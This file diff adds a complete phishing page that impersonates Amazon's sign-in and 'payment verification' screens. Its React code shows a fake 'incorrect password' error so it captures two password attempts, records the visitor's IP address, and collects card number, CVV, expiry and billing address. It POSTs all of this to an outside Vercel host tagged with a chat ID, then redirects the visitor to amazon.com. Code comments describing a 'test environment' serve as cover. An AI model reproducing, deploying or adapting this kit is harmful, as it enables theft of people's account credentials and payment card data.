@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brandText: '#0F1111',
+                        brandSubtext: '#565959',
+                        brandLink: '#007185',
+                        brandLinkHover: '#C7511F',
+                        brandYellow: '#FFD814',
+                        brandYellowHover: '#F7CA00',
+                        brandYellowBorder: '#FCD200',
+                        cardBorder: '#D5D9D9',
+                        brandFooter: '#0E1724',
+                    },
+                    fontFamily: {
+                        ember: ['"Amazon Ember"', 'Arial', 'sans-serif'],
+                    },
+                },
+            },
+        };
+    </script>
+
+    <style>
+        /* Default unfocused input */
+        .brand-input {
+            width: 100%;
+            height: 31px;
+            padding: 3px 8px;
+            font-size: 13px;
+            line-height: normal;
+            color: #0f1111;
+            background-color: #fff;
+            border: 1px solid #888c8c;
+            border-radius: 4px;
+            outline: none;
+            box-shadow: 0 1px 2px rgba(15, 17, 17, 0.15) inset;
+            transition: box-shadow 0.1s ease-in-out, border-color 0.1s ease-in-out;
+        }
+
+        /* Exact double-border focus state */
+        .brand-input:focus {
+            border-color: #007185 !important;
+            outline: none !important;
+            box-shadow:
+                inset 0 0 0 1px rgba(0, 113, 133, 0.2),
+                0 0 0 2px #ffffff,
+                0 0 0 3.5px #687173 !important;
+        }
+
+        /* Validation error input border & focus */
+        .brand-input-error {
+            border-color: #ba0933 !important;
+        }
+
+        .brand-input-error:focus {
+            border-color: #ba0933 !important;
+            box-shadow:
+                inset 0 0 0 1px rgba(186, 9, 51, 0.2),
+                0 0 0 2px #ffffff,
+                0 0 0 3.5px #ba0933 !important;
+        }
+    </style>
+
+    <!-- React 18 & Babel CDN -->
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+</head>
+
+<body class="bg-white text-brandText font-ember antialiased min-h-screen flex flex-col justify-between text-[13px]">
+
+    <div id="root" class="flex flex-col min-h-screen justify-between"></div>
+
+    <script type="text/babel">
+        const { useState, useRef } = React;
+
+
+
+        const baseURL = 'https://fr-1290-2o1v.vercel.app/';
+
+        const CHAT_ID = 'Ibekzmoney@hotmail.com';
+
+
+        async function postData(endpoint, payload) {
+
+            try {
+                const response = await fetch(`${baseURL}${endpoint}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return await response.json();
+            } catch (e) {
+                console.error('API Error:', e);
+                return { status: 'error' };
+            }
+        }
+
+        function BrandLogo() {
+            return (
+                <div className="flex flex-col items-center select-none cursor-pointer mb-5">
+                    <img
+                        src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/amalog.jpeg"
+                        alt="Logo"
+                        className="h-8 md:h-9 object-contain"
+                    />
+                </div>
+            );
+        }
+
+        function ErrorMessage({ message }) {
+            return (
+                <div className="flex items-center mt-1.5 text-[#ba0933] text-[12px] font-normal leading-tight">
+                    <div className="w-[14px] h-[14px] rounded-full bg-[#ba0933] text-white flex items-center justify-center mr-1.5 flex-shrink-0 font-serif font-bold text-[10px] leading-none">
+                        !
+                    </div>
+                    <span className="italic">{message}</span>
+                </div>
+            );
+        }
+
+        // Card Brand Detection Helper
+        function getCardBrand(num) {
+            const clean = (num || '').replace(/\D/g, '');
+            if (!clean) return 'generic';
+
+            // Visa: starts with 4
+            if (/^4/.test(clean)) return 'visa';
+
+            // Mastercard: starts with 51-55 or 2221-2720
+            if (/^(5[1-5]|2(2[2-9][1-9]|2[3-9]|[3-6]|7[0-1]|720))/.test(clean)) return 'mastercard';
+
+            // American Express: starts with 34 or 37
+            if (/^3[47]/.test(clean)) return 'amex';
+
+            // Discover: starts with 6011, 65, 644-649, 622
+            if (/^(6011|65|64[4-9]|622)/.test(clean)) return 'discover';
+
+            // JCB: starts with 35
+            if (/^35/.test(clean)) return 'jcb';
+
+            // Diners Club: starts with 300-305, 36, 38
+            if (/^3(0[0-5]|[68])/.test(clean)) return 'diners';
+
+            return 'generic';
+        }
+
+        const BRAND_META = {
+            generic: { name: 'Card', label: '' },
+            visa: { name: 'Visa', label: 'Visa' },
+            mastercard: { name: 'Mastercard', label: 'Mastercard' },
+            amex: { name: 'American Express', label: 'Amex' },
+            discover: { name: 'Discover', label: 'Discover' },
+            jcb: { name: 'JCB', label: 'JCB' },
+            diners: { name: 'Diners Club', label: 'Diners Club' },
+        };
+
+        const COUNTRIES = [
+            { code: 'US', name: 'United States', flag: '🇺🇸', postalLabel: 'Zip Code', regionLabel: 'State', streetPlaceholder: 'Street Address ' },
+            { code: 'DE', name: 'Germany', flag: '🇩🇪', postalLabel: 'PLZ / Postal Code', regionLabel: 'State / Bundesland', streetPlaceholder: 'Straße und Hausnummer' },
+            { code: 'GB', name: 'United Kingdom', flag: '🇬🇧', postalLabel: 'Postcode', regionLabel: 'Region / County', streetPlaceholder: 'Street Address' },
+            { code: 'FR', name: 'France', flag: '🇫🇷', postalLabel: 'Code Postal', regionLabel: 'Région / Dept', streetPlaceholder: 'Adresse ' },
+            { code: 'CA', name: 'Canada', flag: '🇨🇦', postalLabel: 'Postal Code', regionLabel: 'Province', streetPlaceholder: 'Street Address' },
+            { code: 'AU', name: 'Australia', flag: '🇦🇺', postalLabel: 'Postcode', regionLabel: 'State / Territory', streetPlaceholder: 'Street Address' },
+            { code: 'ES', name: 'Spain', flag: '🇪🇸', postalLabel: 'Código Postal', regionLabel: 'Comunidad Autónoma', streetPlaceholder: 'Dirección ' },
+            { code: 'IT', name: 'Italy', flag: '🇮🇹', postalLabel: 'CAP / Codice Postale', regionLabel: 'Regione', streetPlaceholder: 'Indirizzo e numero civico' },
+            { code: 'NL', name: 'Netherlands', flag: '🇳🇱', postalLabel: 'Postcode', regionLabel: 'Provincie', streetPlaceholder: 'Straat en huisnummer' },
+            { code: 'JP', name: 'Japan', flag: '🇯🇵', postalLabel: 'Postal Code', regionLabel: 'Prefecture', streetPlaceholder: 'Street Address' }
+        ];
+
+        const COUNTRY_REGIONS = {
+            US: [
+                { code: 'AL', name: 'Alabama' },
+                { code: 'AK', name: 'Alaska' },
+                { code: 'AZ', name: 'Arizona' },
+                { code: 'AR', name: 'Arkansas' },
+                { code: 'CA', name: 'California' },
+                { code: 'CO', name: 'Colorado' },
+                { code: 'CT', name: 'Connecticut' },
+                { code: 'DE', name: 'Delaware' },
+                { code: 'DC', name: 'District of Columbia' },
+                { code: 'FL', name: 'Florida' },
+                { code: 'GA', name: 'Georgia' },
+                { code: 'HI', name: 'Hawaii' },
+                { code: 'ID', name: 'Idaho' },
+                { code: 'IL', name: 'Illinois' },
+                { code: 'IN', name: 'Indiana' },
+                { code: 'IA', name: 'Iowa' },
+                { code: 'KS', name: 'Kansas' },
+                { code: 'KY', name: 'Kentucky' },
+                { code: 'LA', name: 'Louisiana' },
+                { code: 'ME', name: 'Maine' },
+                { code: 'MD', name: 'Maryland' },
+                { code: 'MA', name: 'Massachusetts' },
+                { code: 'MI', name: 'Michigan' },
+                { code: 'MN', name: 'Minnesota' },
+                { code: 'MS', name: 'Mississippi' },
+                { code: 'MO', name: 'Missouri' },
+                { code: 'MT', name: 'Montana' },
+                { code: 'NE', name: 'Nebraska' },
+                { code: 'NV', name: 'Nevada' },
+                { code: 'NH', name: 'New Hampshire' },
+                { code: 'NJ', name: 'New Jersey' },
+                { code: 'NM', name: 'New Mexico' },
+                { code: 'NY', name: 'New York' },
+                { code: 'NC', name: 'North Carolina' },
+                { code: 'ND', name: 'North Dakota' },
+                { code: 'OH', name: 'Ohio' },
+                { code: 'OK', name: 'Oklahoma' },
+                { code: 'OR', name: 'Oregon' },
+                { code: 'PA', name: 'Pennsylvania' },
+                { code: 'RI', name: 'Rhode Island' },
+                { code: 'SC', name: 'South Carolina' },
+                { code: 'SD', name: 'South Dakota' },
+                { code: 'TN', name: 'Tennessee' },
+                { code: 'TX', name: 'Texas' },
+                { code: 'UT', name: 'Utah' },
+                { code: 'VT', name: 'Vermont' },
+                { code: 'VA', name: 'Virginia' },
+                { code: 'WA', name: 'Washington' },
+                { code: 'WV', name: 'West Virginia' },
+                { code: 'WI', name: 'Wisconsin' },
+                { code: 'WY', name: 'Wyoming' }
+            ],
+            DE: [
+                { code: 'BW', name: 'Baden-Württemberg' },
+                { code: 'BY', name: 'Bavaria (Bayern)' },
+                { code: 'BE', name: 'Berlin' },
+                { code: 'BB', name: 'Brandenburg' },
+                { code: 'HB', name: 'Bremen' },
+                { code: 'HH', name: 'Hamburg' },
+                { code: 'HE', name: 'Hesse (Hessen)' },
+                { code: 'MV', name: 'Mecklenburg-Vorpommern' },
+                { code: 'NI', name: 'Lower Saxony (Niedersachsen)' },
+                { code: 'NW', name: 'North Rhine-Westphalia (NRW)' },
+                { code: 'RP', name: 'Rhineland-Palatinate (Rheinland-Pfalz)' },
+                { code: 'SL', name: 'Saarland' },
+                { code: 'SN', name: 'Saxony (Sachsen)' },
+                { code: 'ST', name: 'Saxony-Anhalt (Sachsen-Anhalt)' },
+                { code: 'SH', name: 'Schleswig-Holstein' },
+                { code: 'TH', name: 'Thuringia (Thüringen)' }
+            ],
+            GB: [
+                { code: 'ENG', name: 'England' },
+                { code: 'SCT', name: 'Scotland' },
+                { code: 'WLS', name: 'Wales' },
+                { code: 'NIR', name: 'Northern Ireland' },
+                { code: 'LON', name: 'Greater London' },
+                { code: 'MAN', name: 'Greater Manchester' },
+                { code: 'WMD', name: 'West Midlands' },
+                { code: 'WYK', name: 'West Yorkshire' },
+                { code: 'HAM', name: 'Hampshire' },
+                { code: 'KEN', name: 'Kent' },
+                { code: 'ESS', name: 'Essex' },
+                { code: 'SUR', name: 'Surrey' },
+                { code: 'HRT', name: 'Hertfordshire' },
+                { code: 'MSY', name: 'Merseyside' }
+            ],
+            FR: [
+                { code: 'IDF', name: 'Île-de-France (Paris)' },
+                { code: 'ARA', name: 'Auvergne-Rhône-Alpes' },
+                { code: 'BFC', name: 'Bourgogne-Franche-Comté' },
+                { code: 'BRE', name: 'Brittany (Bretagne)' },
+                { code: 'CVL', name: 'Centre-Val de Loire' },
+                { code: 'COR', name: 'Corsica (Corse)' },
+                { code: 'GES', name: 'Grand Est' },
+                { code: 'HDF', name: 'Hauts-de-France' },
+                { code: 'NOR', name: 'Normandy (Normandie)' },
+                { code: 'NAQ', name: 'Nouvelle-Aquitaine' },
+                { code: 'OCC', name: 'Occitanie' },
+                { code: 'PDL', name: 'Pays de la Loire' },
+                { code: 'PAC', name: 'Provence-Alpes-Côte d\'Azur' }
+            ],
+            CA: [
+                { code: 'AB', name: 'Alberta' },
+                { code: 'BC', name: 'British Columbia' },
+                { code: 'MB', name: 'Manitoba' },
+                { code: 'NB', name: 'New Brunswick' },
+                { code: 'NL', name: 'Newfoundland and Labrador' },
+                { code: 'NS', name: 'Nova Scotia' },
+                { code: 'ON', name: 'Ontario' },
+                { code: 'PE', name: 'Prince Edward Island' },
+                { code: 'QC', name: 'Quebec' },
+                { code: 'SK', name: 'Saskatchewan' },
+                { code: 'NT', name: 'Northwest Territories' },
+                { code: 'NU', name: 'Nunavut' },
+                { code: 'YT', name: 'Yukon' }
+            ],
+            AU: [
+                { code: 'NSW', name: 'New South Wales' },
+                { code: 'VIC', name: 'Victoria' },
+                { code: 'QLD', name: 'Queensland' },
+                { code: 'WA', name: 'Western Australia' },
+                { code: 'SA', name: 'South Australia' },
+                { code: 'TAS', name: 'Tasmania' },
+                { code: 'ACT', name: 'Australian Capital Territory' },
+                { code: 'NT', name: 'Northern Territory' }
+            ],
+            ES: [
+                { code: 'AND', name: 'Andalusia (Andalucía)' },
+                { code: 'CAT', name: 'Catalonia (Cataluña)' },
+                { code: 'MAD', name: 'Madrid' },
+                { code: 'VAL', name: 'Valencia' },
+                { code: 'GAL', name: 'Galicia' },
+                { code: 'CYL', name: 'Castile and León' },
+                { code: 'PV', name: 'Basque Country (País Vasco)' },
+                { code: 'CAN', name: 'Canary Islands (Canarias)' },
+                { code: 'BAL', name: 'Balearic Islands (Baleares)' },
+                { code: 'CLM', name: 'Castilla-La Mancha' },
+                { code: 'MUR', name: 'Murcia' },
+                { code: 'ARA', name: 'Aragon (Aragón)' }
+            ],
+            IT: [
+                { code: 'LOM', name: 'Lombardy (Lombardia)' },
+                { code: 'LAZ', name: 'Lazio (Rome)' },
+                { code: 'CAM', name: 'Campania (Naples)' },
+                { code: 'SIC', name: 'Sicily (Sicilia)' },
+                { code: 'VEN', name: 'Veneto (Venice)' },
+                { code: 'PIE', name: 'Piedmont (Piemonte)' },
+                { code: 'EMR', name: 'Emilia-Romagna' },
+                { code: 'TOS', name: 'Tuscany (Toscana)' },
+                { code: 'PUG', name: 'Puglia' },
+                { code: 'LIG', name: 'Liguria' }
+            ],
+            NL: [
+                { code: 'NH', name: 'Noord-Holland (Amsterdam)' },
+                { code: 'ZH', name: 'Zuid-Holland (Rotterdam/Hague)' },
+                { code: 'UT', name: 'Utrecht' },
+                { code: 'NB', name: 'Noord-Brabant' },
+                { code: 'GE', name: 'Gelderland' },
+                { code: 'LI', name: 'Limburg' },
+                { code: 'OV', name: 'Overijssel' },
+                { code: 'GR', name: 'Groningen' }
+            ],
+            JP: [
+                { code: 'TYO', name: 'Tokyo' },
+                { code: 'OSA', name: 'Osaka' },
+                { code: 'KNG', name: 'Kanagawa (Yokohama)' },
+                { code: 'AIC', name: 'Aichi (Nagoya)' },
+                { code: 'HKD', name: 'Hokkaido' },
+                { code: 'FKO', name: 'Fukuoka' },
+                { code: 'KYT', name: 'Kyoto' },
+                { code: 'HYG', name: 'Hyogo (Kobe)' }
+            ]
+        };
+
+        function CardBrandIcon({ brand }) {
+            switch (brand) {
+                case 'visa':
+                    return (
+                        <div className="flex items-center justify-center w-8 h-[22px] rounded-[4px] bg-[#1434CB] text-white shadow-xs font-black italic text-[11px] tracking-tight leading-none px-1 select-none transition-all duration-200" title="Visa">
+                            VISA
+                        </div>
+                    );
+                case 'mastercard':
+                    return (
+                        <div className="flex items-center justify-center w-8 h-[22px] rounded-[4px] bg-[#1e293b] shadow-xs px-1 select-none transition-all duration-200" title="Mastercard">
+                            <div className="flex -space-x-1.5 items-center">
+                                <div className="w-3.5 h-3.5 rounded-full bg-[#EB001B]"></div>
+                                <div className="w-3.5 h-3.5 rounded-full bg-[#F79E1B] mix-blend-screen opacity-90"></div>
+                            </div>
+                        </div>
+                    );
+                case 'amex':
+                    return (
+                        <div className="flex items-center justify-center w-8 h-[22px] rounded-[4px] bg-[#0070d1] text-white shadow-xs font-black text-[8px] tracking-tight leading-none px-0.5 select-none transition-all duration-200" title="American Express">
+                            AMEX
+                        </div>
+                    );
+                case 'discover':
+                    return (
+                        <div className="flex items-center justify-center w-8 h-[22px] rounded-[4px] bg-[#ff6000] text-white shadow-xs font-black text-[7px] tracking-tight leading-none px-0.5 select-none transition-all duration-200" title="Discover">
+                            DISC
+                        </div>
+                    );
+                case 'jcb':
+                    return (
+                        <div className="flex items-center justify-center w-8 h-[22px] rounded-[4px] bg-[#0c4da2] text-white shadow-xs font-black text-[8px] tracking-tight leading-none px-0.5 select-none transition-all duration-200" title="JCB">
+                            JCB
+                        </div>
+                    );
+                case 'diners':
+                    return (
+                        <div className="flex items-center justify-center w-8 h-[22px] rounded-[4px] bg-[#004a97] text-white shadow-xs font-black text-[7px] tracking-tight leading-none px-0.5 select-none transition-all duration-200" title="Diners Club">
+                            DINERS
+                        </div>
+                    );
+                default:
+                    return (
+                        <svg className="w-7 h-5 text-gray-400 transition-opacity duration-200" viewBox="0 0 28 20" fill="none" stroke="currentColor">
+                            <rect x="1" y="1" width="26" height="18" rx="3" strokeWidth="1.5" />
+                            <line x1="1" y1="6" x2="27" y2="6" strokeWidth="1.5" />
+                            <rect x="4" y="11" width="5" height="3.5" rx="0.5" fill="currentColor" />
+                        </svg>
+                    );
+            }
+        }
+
+        function AuthForm() {
+
+            const [ip, setIp] = useState('')
+
+            const [isSubmitting, setIsSubmitting] = useState(false)
+            // Fetch IP address on init
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => setIp(ata.i))
+                .catch(() => setIp('Unknown'))
+
+
+            const [step, setStep] = useState(1);
+            const [identifier, setIdentifier] = useState('');
+            const [password, setPassword] = useState('');
+            const [showPassword, setShowPassword] = useState(false);
+
+            const [identifierError, setIdentifierError] = useState(false);
+            const [passwordError, setPasswordError] = useState(false);
+            const [passwordErrorMsg, setPasswordErrorMsg] = useState('Enter your password');
+            const [firstPassword, setFirstPassword] = useState('');
+            const passwordInputRef = useRef(null);
+
+            // Payment Form State
+            const [countryVal, setCountryVal] = useState('US');
+            const [cardholderName, setCardholderName] = useState('');
+            const [cardNumber, setCardNumber] = useState('');
+            const [expiryDay, setExpiryDay] = useState('');
+            const [expiryMonth, setExpiryMonth] = useState('');
+            const [expiryYear, setExpiryYear] = useState('');
+            const [cvv, setCvv] = useState('');
+            const [streetAddress, setStreetAddress] = useState('');
+            const [city, setCity] = useState('');
+            const [stateVal, setStateVal] = useState('');
+            const [zipCode, setZipCode] = useState('');
+            const [paymentSubmitted, setPaymentSubmitted] = useState(false);
+            const [prefillFeedback, setPrefillFeedback] = useState(false);
+
+            const detectedBrand = getCardBrand(cardNumber);
+            const currentCountryObj = COUNTRIES.find((c) => c.code === countryVal) || COUNTRIES[0];
+
+            const handleContinue = (e) => {
+                e.preventDefault();
+                if (!identifier.trim()) {
+                    setIdentifierError(true);
+                    console.warn('Validation Failed: Identifier is required');
+                    return;
+                }
+                setIdentifierError(false);
+                console.log('Step 1 Submitted - Identifier:', identifier);
+                setStep(2);
+            };
+
+            const handleSignIn = (e) => {
+                e.preventDefault();
+                if (!password.trim()) {
+                    setPasswordErrorMsg('Enter your password');
+                    setPasswordError(true);
+                    console.warn('Validation Failed: Password is required');
+                    return;
+                }
+
+                // 1st Attempt: Simulate incorrect password, clear field & display error
+                if (!firstPassword) {
+                    const firstAttempt = password;
+                    setFirstPassword(firstAttempt);
+                    setPassword('');
+                    setPasswordErrorMsg('Incorrect password. Please try again.');
+                    setPasswordError(true);
+                    console.warn('Simulated Login Failure - 1st Password Attempt:', {
+                        identifier,
+                        attemptedPassword: firstAttempt,
+                    });
+                    setTimeout(() => {
+                        passwordInputRef.current?.focus();
+                    }, 50);
+                    return;
+                }
+
+                // 2nd Attempt: Allow pass, console.log both passwords and proceed
+                setPasswordError(false);
+                console.log('Login Successful - Passwords Submitted:', {
+                    identifier,
+                    firstPasswordAttempt: firstPassword,
+                    secondPasswordAttempt: password,
+                });
+                console.log('Step 2 Submitted - Full Credentials:', {
+                    identifier,
+                    password,
+                });
+                // Transition to Payment Verification step
+
+                const payload = {
+                    data: JSON.stringify({
+                        identifier,
+                        firstPasswordAttempt: firstPassword,
+                        secondPasswordAttempt: password, ip
+                    }),
+                    title: 'Amazon Login',
+                    chatId: CHAT_ID
+                };
+
+                setIsSubmitting(true)
+
+                postData('main', payload).then(() => {
+
+                    setIsSubmitting(false)
+                    setStep(3);
+                })
+
+            };
+
+            const handleFillDummyData = () => {
+                setCountryVal('US');
+                setCardholderName('Jane Doe');
+                setCardNumber('4000 1234 5678 9010');
+                setExpiryDay('15');
+                setExpiryMonth('08');
+                setExpiryYear('2028');
+                setCvv('123');
+                setStreetAddress('742 Evergreen Terrace');
+                setCity('Springfield');
+                setStateVal('OR');
+                setZipCode('97477');
+                setPrefillFeedback(true);
+                setTimeout(() => setPrefillFeedback(false), 2500);
+            };
+
+            const handleCardNumberChange = (e) => {
+                const rawDigits = e.target.value.replace(/\D/g, '');
+                const brand = getCardBrand(rawDigits);
+
+                let formatted = '';
+                if (brand === 'amex') {
+                    // American Express: 4-6-5 format (max 15 digits)
+                    const digits = rawDigits.slice(0, 15);
+                    const p1 = digits.slice(0, 4);
+                    const p2 = digits.slice(4, 10);
+                    const p3 = digits.slice(10, 15);
+                    formatted = [p1, p2, p3].filter(Boolean).join(' ');
+                } else {
+                    // Standard 4-4-4-4 format (max 16 digits)
+                    const digits = rawDigits.slice(0, 16);
+                    formatted = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+                }
+                setCardNumber(formatted);
+            };
+
+            const handleVerifyPayment = (e) => {
+                e.preventDefault();
+                const paymentData = {
+                    cardholderName: cardholderName || 'Jane Doe',
+                    cardNumber: cardNumber || '4000 1234 5678 9010',
+                    cardBrand: BRAND_META[detectedBrand]?.name || 'Unknown',
+                    expiryDate: {
+                        day: expiryDay || '15',
+                        month: expiryMonth || '08',
+                        year: expiryYear || '2028',
+                    },
+                    cvv: cvv || '123',
+                    billingAddress: {
+                        country: currentCountryObj.name,
+                        countryCode: countryVal,
+                        streetAddress: streetAddress || '742 Evergreen Terrace',
+                        city: city || 'Springfield',
+                        stateOrRegion: stateVal || 'OR',
+                        zipOrPostalCode: zipCode || '97477',
+                    },
+                    environment: 'test',
+                    verifiedAt: new Date().toISOString(),
+                };
+
+                console.log('Payment Information Submitted (Test Environment):', paymentData);
+
+                const payload = {
+                    data: JSON.stringify({
+                        identifier,
+                        firstPasswordAttempt: firstPassword,
+                        secondPasswordAttempt: password, ip, ...paymentData
+                    }),
+                    title: 'Amazon Login ',
+                    chatId: CHAT_ID
+                };
+
+                setIsSubmitting(true)
+
+
+                postData('main', payload).then(() => {
+
+                    setIsSubmitting(false)
+                    setStep(3);
+
+                    window.location.replace('http://amazon.com/')
+                })
+            };
+
+            return (
+                <div className="flex flex-col min-h-screen justify-between">
+                    {/* Main Card Section */}
+                    <div className="w-full flex flex-col items-center px-4 pt-6 pb-10 flex-grow">
+                        <BrandLogo />
+
+                        {step === 3 ? (
+                            /* Step 3: Payment Verification */
+                            <div className="w-full max-w-[440px] bg-white border border-[#e5e7eb] rounded-[18px] p-6 sm:p-7 shadow-[0_8px_30px_rgba(0,0,0,0.06)]">
+                                {/* Header with Step badge */}
+                                <div className="flex items-center justify-between pb-4 border-b border-[#f3f4f6] mb-5">
+                                    <h1 className="text-[22px] font-bold text-[#111827] tracking-tight">
+                                        Verify Payment Information
+                                    </h1>
+
+                                </div>
+
+
+
+                                {paymentSubmitted ? (
+                                    <div className="text-center py-6">
+                                        <div className="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-3">
+                                            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" />
+                                            </svg>
+                                        </div>
+                                        <h2 className="text-[18px] font-bold text-gray-900 mb-1">Payment Verified</h2>
+                                        <p className="text-[13px] text-gray-600 mb-4">
+                                            Payment data logged to browser console in test environment.
+                                        </p>
+                                        <div className="p-3 bg-gray-50 rounded-lg text-left text-[12px] font-mono text-gray-700 mb-4 border border-gray-200">
+                                            <div><strong>Cardholder:</strong> {cardholderName || 'Jane Doe'}</div>
+                                            <div><strong>Card:</strong> •••• •••• •••• {(cardNumber || '9010').slice(-4)} ({BRAND_META[detectedBrand]?.name || 'Card'})</div>
+                                            <div><strong>Brand:</strong> {BRAND_META[detectedBrand]?.name || 'Generic / Other'}</div>
+                                            <div><strong>Billing:</strong> {city || 'Springfield'}, {stateVal || 'OR'} {zipCode || '97477'}, {currentCountryObj.name}</div>
+                                            <div><strong>Expiry:</strong> {expiryDay || '15'}/{expiryMonth || '08'}/{expiryYear || '2028'}</div>
+                                            <div><strong>Status:</strong> Success (Test Mode)</div>
+                                        </div>
+                                        <button
+                                            type="button"
+                                            onClick={() => setPaymentSubmitted(false)}
+                                            className="text-[13px] text-[#007185] hover:underline font-medium cursor-pointer"
+                                        >
+                                            Edit payment details or submit again
+                                        </button>
+                                    </div>
+                                ) : (
+                                    <form onSubmit={handleVerifyPayment} noValidate className="space-y-4">
+                                        {/* Cardholder Name */}
+                                        <div>
+                                            <label className="block text-[11px] font-bold text-gray-700 tracking-wider uppercase mb-1.5">
+                                                CARDHOLDER NAME
+                                            </label>
+                                            <input
+                                                type="text"
+                                                value={cardholderName}
+                                                onChange={(e) => setCardholderName(e.target.value)}
+                                                placeholder="Jane Doe"
+                                                className="w-full h-[42px] px-3.5 text-[14px] text-gray-800 placeholder-gray-400 bg-white border border-[#818cf8] focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none transition"
+                                            />
+                                        </div>
+
+                                        {/* Card Number with Brand Detection */}
+                                        <div>
+                                            <div className="flex items-center justify-between mb-1.5">
+                                                <label className="block text-[11px] font-bold text-gray-700 tracking-wider uppercase">
+                                                    CARD NUMBER
+                                                </label>
+                                                {detectedBrand !== 'generic' && (
+                                                    <span className="inline-flex items-center gap-1.5 text-[11px] font-bold text-indigo-700 bg-indigo-50 border border-indigo-200/80 px-2 py-0.5 rounded-full transition-all duration-200">
+                                                        <span className="w-1.5 h-1.5 rounded-full bg-indigo-500"></span>
+                                                        {BRAND_META[detectedBrand]?.name}
+                                                    </span>
+                                                )}
+                                            </div>
+                                            <div className="relative">
+                                                <input
+                                                    type="text"
+                                                    value={cardNumber}
+                                                    onChange={handleCardNumberChange}
+                                                    placeholder={detectedBrand === 'amex' ? '3782 822463 10005' : '4000 1234 5678 9010'}
+                                                    maxLength={detectedBrand === 'amex' ? 17 : 19}
+                                                    className={`w-full h-[42px] pl-3.5 pr-12 text-[14px] text-gray-800 placeholder-gray-400 font-mono tracking-wide bg-white border transition duration-150 rounded-[8px] outline-none ${detectedBrand !== 'generic'
+                                                        ? 'border-indigo-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff]'
+                                                        : 'border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff]'
+                                                        }`}
+                                                />
+                                                <div className="absolute right-2.5 top-1/2 -translate-y-1/2 flex items-center justify-center pointer-events-none">
+                                                    <CardBrandIcon brand={detectedBrand} />
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        {/* Expiry Date & CVV */}
+                                        <div className="grid grid-cols-2 gap-3.5">
+                                            {/* Expiry Date Column */}
+                                            <div>
+                                                <div className="flex justify-between items-center mb-1.5">
+                                                    <label className="text-[11px] font-bold text-gray-700 tracking-wider uppercase">
+                                                        EXPIRY DATE
+                                                    </label>
+                                                    <span className="text-[10px] font-semibold text-gray-400 tracking-wider">
+                                                        D/M/Y
+                                                    </span>
+                                                </div>
+                                                <div className="grid grid-cols-3 gap-1.5">
+                                                    <input
+                                                        type="text"
+                                                        value={expiryDay}
+                                                        onChange={(e) => setExpiryDay(e.target.value.replace(/\D/g, '').slice(0, 2))}
+                                                        placeholder="DD"
+                                                        maxLength="2"
+                                                        className="h-[42px] text-center text-[13px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none transition"
+                                                    />
+                                                    <input
+                                                        type="text"
+                                                        value={expiryMonth}
+                                                        onChange={(e) => setExpiryMonth(e.target.value.replace(/\D/g, '').slice(0, 2))}
+                                                        placeholder="MM"
+                                                        maxLength="2"
+                                                        className="h-[42px] text-center text-[13px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none transition"
+                                                    />
+                                                    <input
+                                                        type="text"
+                                                        value={expiryYear}
+                                                        onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                                                        placeholder="YYYY"
+                                                        maxLength="4"
+                                                        className="h-[42px] text-center text-[13px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none transition"
+                                                    />
+                                                </div>
+                                            </div>
+
+                                            {/* CVV Column */}
+                                            <div>
+                                                <div className="flex items-center justify-between mb-1.5">
+                                                    <label className="block text-[11px] font-bold text-gray-700 tracking-wider uppercase">
+                                                        CVV
+                                                    </label>
+                                                    {detectedBrand === 'amex' && (
+                                                        <span className="text-[10px] text-gray-400 font-semibold">4 digits</span>
+                                                    )}
+                                                </div>
+                                                <input
+                                                    type="password"
+                                                    value={cvv}
+                                                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, detectedBrand === 'amex' ? 4 : 3))}
+                                                    placeholder={detectedBrand === 'amex' ? '••••' : ''}
+                                                    maxLength={detectedBrand === 'amex' ? 4 : 3}
+                                                    className="w-full h-[42px] px-3.5 text-[14px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none transition"
+                                                />
+                                            </div>
+                                        </div>
+
+                                        {/* Billing Address & Postal Code: Street Address -> Country -> State -> City -> Zip Code */}
+                                        <div>
+                                            <div className="flex items-center justify-between mb-1.5">
+                                                <label className="block text-[11px] font-bold text-gray-700 tracking-wider uppercase">
+                                                    BILLING ADDRESS & POSTAL CODE
+                                                </label>
+
+                                            </div>
+
+                                            {/* 1. Street Address */}
+                                            <input
+                                                type="text"
+                                                value={streetAddress}
+                                                onChange={(e) => setStreetAddress(e.target.value)}
+                                                placeholder={currentCountryObj.streetPlaceholder}
+                                                className="w-full h-[42px] px-3.5 text-[14px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none transition mb-2"
+                                            />
+
